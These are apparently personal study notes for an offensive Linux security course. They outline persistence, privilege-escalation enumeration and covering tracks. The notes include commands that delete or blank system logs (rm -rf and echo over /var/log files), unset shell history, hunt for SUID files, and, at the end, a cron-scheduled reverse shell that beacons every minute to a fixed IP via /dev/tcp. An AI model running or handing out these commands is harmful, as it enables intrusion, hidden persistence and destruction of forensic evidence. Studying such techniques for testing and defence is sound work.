Persistence
  methods of persistance
    adding or hijacking a user account
    implementing boot process persistence
    adding or modifying a CRON job
    adding a kernel module (with a backdoor)
    additional methods outside the scope of the SG

Privilege Escalation
  enumerating for privilege escalation
    sudo -l
      cat /etc/sudoers
        master file for all sudo permissions
      lists available commands your user can sudo with
    vulnerable suid/sgid executables
      files that can be executed as if you were the owner or in the owner's group
      https://gtfobins.github.io/
        use with `find / -type f -perm /(2,4,6)000 -ls 2>/dev/null` for goated dubs
    id
      groups=10(wheel)
        means you can do a lot
    impoperly configured cron jobs
      cron jobs can be set up to open/run applications or commands as root
      https://crontab.guru
    vulnerable services
      similar to cron jobs
      check systemd for services
    kernel exploits
      wall hacks if defender doesn't keep their shit updated
    World-Writable Files and Folders
      $PATH=$PATH+/insert/directory
      don't even bother it's retarded

BIG ONES ARE USERS, SSH KEYS, SUDO AND CRON

COVERING YOUR TRACKS
  Plan
    Prior, after, before (know the system)
      what will happen if I do X (what logging)
      checks (where are things)
      hide (file locaitons, names, times)
    When do you start covering your tracks?
  NIX-ism
    unset HISTFILE
    beware of init system in use
      (systemv, systemd, updstart, etc)
        typically going to be systemv
        determines what commands to use and logging structure
        figure out with ps -p 1
    auditing systemv
      ausearch: pulls from audit.log
        ausearch -p 22
        ausearch -m USER_LOGIN -sv no
        ausearch -ua edwards -ts yesterday -te now -i
    verify on systemD
      journalctl _TRANSPORT=audit
      journal _TRANSPORT=audit | grep 603
  Logs for covering your tracks:
    auth.log/secure
      logins/authentications
    lastlog
      ech user's last successful login time
    btmp
      bad login attempts
    sulog
      usage of SU commands
    utmp
      currently logged in users (W command)
    wtmp
      permanent record on user on/off
  best EASY way to clean logs
    rm -rf /var/log/...
    echo /dev/null > /var/log/...
    echo > /var/log/...

  remote logging
    check for /etc/rsyslog.d/* for newer versions and /etc/rsyslog.conf for older ones
      grep "IncludeConfig" /etc/rsyslog.conf


TO CREATE A REVERSE SHELL THAT BEACONS OUT EVERY MINUTE
  crontab -e
  * * * * * /bin/bash -c 'while true; do /bin/bash -i >& /dev/tcp/192.168.28.135/33403 0>&1; sleep 60; done'
